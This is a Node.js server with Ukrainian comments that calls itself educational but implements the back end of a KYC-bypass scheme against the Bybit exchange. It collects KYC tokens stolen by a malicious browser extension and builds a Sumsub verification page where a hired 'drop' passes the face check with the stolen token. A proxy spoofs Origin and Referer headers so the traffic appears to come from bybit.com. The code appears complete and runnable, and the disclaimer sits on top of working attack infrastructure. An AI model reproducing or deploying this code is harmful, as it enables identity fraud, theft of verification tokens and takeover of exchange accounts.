/**
 * EDUCATIONAL PURPOSE ONLY
 * Цей сервер демонструє, як зловмисні розширення (або легітимні інтеграції)
 * отримують токени та передають їх на бекенд для подальшого використання.
 */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

// Дозволяємо CORS, оскільки запити будуть йти з розширення (з доменів Bybit або chrome-extension://)
app.use(cors({
    origin: '*' // В реальності зловмисники дозволяють усі домени
}));

app.use(express.json());

// ПРОКСІ: Підміна заголовків (Spoofer)
// Перенаправляємо всі запити з /sumsub-proxy на справжні API Sumsub,
// підміняючи заголовки так, щоб сервер Sumsub думав, що запит іде з сайту Bybit.
app.use('/sumsub-proxy', createProxyMiddleware({
    target: 'https://api.sumsub.com',
    changeOrigin: true,
    pathRewrite: {
        '^/sumsub-proxy': '', // Видаляємо префікс перед відправкою до api.sumsub.com
    },
    onProxyReq: (proxyReq, req, res) => {
        // Найголовніше: підміна заголовків (Spoofing)
        proxyReq.setHeader('Origin', 'https://www.bybit.com');
        proxyReq.setHeader('Referer', 'https://www.bybit.com/');
        console.log(`[ПРОКСІ] Перехоплено запит до API Sumsub. Підмінено Origin на Bybit.`);
    }
}));

// База даних у пам'яті (Для навчання). В реальності тут Redis або база даних.
const sessions = new Map();

/**
 * Ендпоінт /bind (Або /api/kyc/receiver)
 * Сюди розширення відправляє вкрадений токен KYC та UID користувача.
 */
app.post('/bind', (req, res) => {
    const { hash: uidHash, token: kycToken } = req.body;

    if (!kycToken) {
        return res.status(400).json({ status: "error", message: "KYC Token is missing" });
    }

    // Зловмисник генерує унікальне "посилання" (капсулу) для дропа, який буде проходити KYC
    const linkId = crypto.randomBytes(12).toString('hex');

    // Зберігаємо токен у базі, прив'язуючи його до linkId
    sessions.set(linkId, {
        uidHash: uidHash || "Unknown",
        kycToken: kycToken,
        createdAt: new Date().toISOString()
    });

    console.log(`\n[+] [EDUCATIONAL LOG] Отримано новий KYC токен!`);
    console.log(`    UID Hash: ${uidHash}`);
    console.log(`    Створено лінк для обходу: /verify?linkId=${linkId}`);

    // Повертаємо linkId розширенню, щоб воно (або зловмисник) знало, куди переходити
    res.json({ status: "success", linkId: linkId });
});

/**
 * Ендпоінт /verify (Сторінка "Капсули")
 * Це сторінка, яку відкриває "Дроп" (людина, яка здає обличчя) на іншому пристрої.
 * Тут ініціалізується SDK (наприклад, Sumsub) за допомогою викраденого токена.
 */
app.get('/verify', (req, res) => {
    const { linkId } = req.query;

    if (!linkId || !sessions.has(linkId)) {
        return res.status(404).send("<h2>[Educational] Помилка: Посилання недійсне або протерміноване</h2>");
    }

    const sessionData = sessions.get(linkId);

    // В реальному експлойті тут ініціалізується Sumsub Web SDK (або іншого провайдера).
    // Він використовує kycToken, щоб змусити систему думати, що це оригінальний користувач Bybit.
    const htmlResponse = `
        <!DOCTYPE html>
        <html lang="uk">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>KYC Capsule (Sumsub SDK Demo)</title>
            <style>
                body { font-family: Arial, sans-serif; background-color: #1a1a1a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .card { background: #2a2a2a; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 100%; max-width: 600px; text-align: center; }
                .info { font-size: 13px; color: #aaa; margin-bottom: 20px; word-break: break-all; }
                #sumsub-websdk-container { background: #fff; border-radius: 8px; overflow: hidden; min-height: 400px; }
            </style>
            <!-- 1. Підключаємо офіційний скрипт Sumsub WebSDK -->
            <script src="https://apps.sumsub.com/idensic/static/sns-websdk-builder.js"></script>
        </head>
        <body>
            <div class="card">
                <h3>Запуск верифікації (Sumsub Camera)</h3>
                <div class="info">
                    Використовується викрадений токен для UID: <b>${sessionData.uidHash}</b><br>
                    Токен: <span style="color: #4CAF50;">${sessionData.kycToken.substring(0, 30)}...</span>
                </div>
                
                <!-- 2. Контейнер, де відмалюється камера Sumsub -->
                <div id="sumsub-websdk-container">Очікування ініціалізації камери...</div>
            </div>

            <script>
                // 3. Ініціалізація Sumsub SDK за допомогою викраденого токена
                const accessToken = "${sessionData.kycToken}";

                function launchSumsub() {
                    try {
                        let snsWebSdkInstance = snsWebSdk.init(
                            accessToken,
                            // Спеціальні колбеки для керування станом
                            () => {
                                console.log("Token updated/expired");
                            }
                        )
                        .withConf({
                            lang: 'en', 
                            customCssStr: "" // Можна вставити CSS, щоб приховати непотрібні елементи інтерфейсу
                        })
                        .withOptions({
                            // НАЙВАЖЛИВІШЕ: Змушуємо SDK надсилати запити через наш сервер-проксі,
                            // а не напряму на api.sumsub.com. Там ми "на льоту" підмінимо заголовки.
                            addBaseUrl: true,
                            baseUrl: window.location.origin + '/sumsub-proxy'
                        })
                        .on('idCheck.stepCompleted', (payload) => {
                            console.log("Крок верифікації пройдено:", payload);
                        })
                        .on('idCheck.onResult', (payload) => {
                            console.log("ФІНАЛЬНИЙ РЕЗУЛЬТАТ:", payload);
                            // Тут зловмисник відправляє в Телеграм повідомлення "Дроп пройшов перевірку успішно!"
                            alert("Верифікацію завершено! Bybit прийняв це обличчя як ваше.");
                        })
                        .build();

                        // 4. Запускаємо SDK в наш HTML-контейнер
                        snsWebSdkInstance.launch('#sumsub-websdk-container');
                        
                    } catch (e) {
                        document.getElementById('sumsub-websdk-container').innerHTML = 
                            '<p style="color:red; padding:20px;">Помилка запуску SDK. Токен можливо вже недійсний або Bybit вимагає додаткових CORS-заголовків: ' + e.message + '</p>';
                    }
                }

                // Запускаємо при завантаженні сторінки
                launchSumsub();
            </script>
        </body>
        </html>
    `;

    res.send(htmlResponse);
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n========================================`);
    console.log(`[EDUCATIONAL] Сервер-приймач запущено на порту ${PORT}`);
    console.log(`Очікування POST запитів від розширення на http://localhost:${PORT}/bind`);
    console.log(`========================================\n`);
});
